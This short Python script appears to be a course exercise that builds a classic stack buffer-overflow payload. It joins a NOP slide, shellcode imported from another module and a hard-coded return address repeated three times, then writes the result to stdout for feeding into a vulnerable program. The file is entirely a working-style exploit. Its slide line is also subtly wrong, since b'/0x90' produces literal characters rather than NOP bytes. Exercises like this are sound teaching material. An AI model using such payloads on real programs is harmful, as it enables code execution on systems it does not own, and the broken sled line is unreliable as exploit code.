import sys
from struct import pack
from shellcode import shellcode

addr = pack('<I', 0xfff6eb30)
slide = b'/0x90'*194

# Implement your attack here!
payload = slide + shellcode + addr + addr  + addr  #spam addr

# Launch the attack!
sys.stdout.buffer.write(payload)
